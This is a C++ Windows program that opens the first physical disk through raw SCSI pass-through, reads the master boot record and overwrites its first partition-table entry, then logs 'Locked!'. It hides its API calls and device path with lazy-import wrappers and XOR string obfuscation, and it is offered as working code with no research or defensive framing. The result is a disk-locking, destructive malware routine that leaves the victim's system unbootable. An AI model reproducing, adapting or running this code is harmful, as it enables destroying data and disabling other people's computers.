#include "AApch.h"
#include "spdlog/spdlog.h"

template <typename T> inline T swap_endian(IN T u) {
  union {
    T u;
    unsigned char u8[sizeof(T)];
  } source, dest;

  source.u = u;

  for (size_t k = 0; k < sizeof(T); k++)
    dest.u8[k] = source.u8[sizeof(T) - k - 1];

  return dest.u;
}

#define RTL_CONSTANT_STRING(s)                                                 \
  { sizeof(s) - sizeof(WCHAR), sizeof(s) - sizeof(WCHAR), (PWSTR)s }
#define RTL_CONSTANT_OBJECT_ATTRIBUTES(n, a)                                   \
  {                                                                            \
    sizeof(OBJECT_ATTRIBUTES), NULL, RTL_CONST_CAST(PUNICODE_STRING)(n), a,    \
        NULL, NULL                                                             \
  }

typedef struct _SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER {
  SCSI_PASS_THROUGH_DIRECT ScsiCmd;
  SENSE_DATA SenseData;
} SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER, *PSCSI_PASS_THROUGH_DIRECT_WITH_BUFFER;

typedef struct _SCSI_PASS_THROUGH_WITH_BUFFER {
  SCSI_PASS_THROUGH ScsiCmd;
  SENSE_DATA SenseData;
} SCSI_PASS_THROUGH_WITH_BUFFER, *PSCSI_PASS_THROUGH_WITH_BUFFER;

BOOL ScsiReadWriteDisk(HANDLE hDisk, BOOLEAN IsRead, ULONG64 OffsetInSector,
                       PVOID pBuffer, ULONG32 SizeOfBufferInSector,
                       BOOLEAN IsCdb16 = TRUE) {
  SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER ScsiBuffer{0};
  PCDB pCdb = (PCDB)ScsiBuffer.ScsiCmd.Cdb;
  ScsiBuffer.ScsiCmd.Length = sizeof(SCSI_PASS_THROUGH_DIRECT);
  ScsiBuffer.ScsiCmd.SenseInfoLength = sizeof(ScsiBuffer.SenseData);
  if (IsRead) {
    ScsiBuffer.ScsiCmd.DataIn = SCSI_IOCTL_DATA_IN;
    pCdb->CDB12.OperationCode = IsCdb16 ? 0x88 : SCSIOP_READ12;
  } else {
    ScsiBuffer.ScsiCmd.DataIn = SCSI_IOCTL_DATA_OUT;
    pCdb->CDB12.OperationCode = IsCdb16 ? 0x8A : SCSIOP_WRITE12;
  }
  ScsiBuffer.ScsiCmd.DataTransferLength = SizeOfBufferInSector * 512;
  ScsiBuffer.ScsiCmd.TimeOutValue =
      (ScsiBuffer.ScsiCmd.DataTransferLength >> 10) + 5;
  ScsiBuffer.ScsiCmd.DataBuffer = pBuffer;
  ScsiBuffer.ScsiCmd.SenseInfoOffset =
      offsetof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER, SenseData);
  if (IsCdb16) {
    ScsiBuffer.ScsiCmd.CdbLength = 16;
    *(PULONG64)pCdb->CDB16.LogicalBlock = swap_endian<ULONG64>(OffsetInSector);
    *(PULONG32)pCdb->CDB16.TransferLength =
        swap_endian<ULONG32>(SizeOfBufferInSector);
  } else {
    ScsiBuffer.ScsiCmd.CdbLength = CDB12GENERIC_LENGTH;
    *(PULONG32)pCdb->CDB12.LogicalBlock =
        swap_endian<ULONG32>((ULONG32)OffsetInSector);
    *(PULONG32)pCdb->CDB12.TransferLength =
        swap_endian<ULONG32>(SizeOfBufferInSector);
  }

  DWORD Returned = 0;
  return LI_FN(DeviceIoControl)(
             hDisk, IOCTL_SCSI_PASS_THROUGH_DIRECT, &ScsiBuffer.ScsiCmd,
             sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER), &ScsiBuffer.ScsiCmd,
             sizeof(SCSI_PASS_THROUGH_DIRECT_WITH_BUFFER), &Returned,
             nullptr) &&
         !ScsiBuffer.ScsiCmd.ScsiStatus;
}

int wmain(uint16_t argc, wchar_t **argv) {
  auto DiskHandle = LI_FN(CreateFileW)(
      XorStrW(L"\\\\.\\PhysicalDrive0"), FILE_WRITE_DATA | FILE_READ_DATA,
      FILE_SHARE_WRITE | FILE_SHARE_READ, nullptr, OPEN_EXISTING,
      FILE_ATTRIBUTE_NORMAL, nullptr);

  if (DiskHandle != INVALID_HANDLE_VALUE) {
    BYTE Sector[0x200]{0x00};

    if (ScsiReadWriteDisk(DiskHandle, TRUE, 0, Sector,
                          sizeof(Sector) / 0x200)) {
      Sector[0x1BE] = 0x80;
      Sector[0x1BF] = 0xFE;
      Sector[0x1C0] = 0xFF;
      Sector[0x1C1] = 0xFF;
      Sector[0x1C2] = 0x0F;
      Sector[0x1C3] = 0xFE;
      Sector[0x1C4] = 0xFF;
      Sector[0x1C5] = 0xFF;
      Sector[0x1C6] = 0x00;
      Sector[0x1C7] = 0x00;
      Sector[0x1C8] = 0x00;
      Sector[0x1C9] = 0x00;
      Sector[0x1CA] = 0x01;
      Sector[0x1CB] = 0x00;
      Sector[0x1CC] = 0x00;
      Sector[0x1CD] = 0x00;

      if (ScsiReadWriteDisk(DiskHandle, FALSE, 0, Sector,
                            sizeof(Sector) / 0x200)) {
        spdlog::debug("Locked!");
      } else {
        spdlog::error("WriteFile error, GetLastError(): {}", GetLastError());
      }
    } else {
      spdlog::debug("ReadFile error, GetLastError(): {}", GetLastError());
    }

    LI_FN(CloseHandle)(DiskHandle);
  } else {
    spdlog::debug("CreateFile error, GetLastError(): {}", GetLastError());
  }

  ExitProcess(0);

  return 0;
}
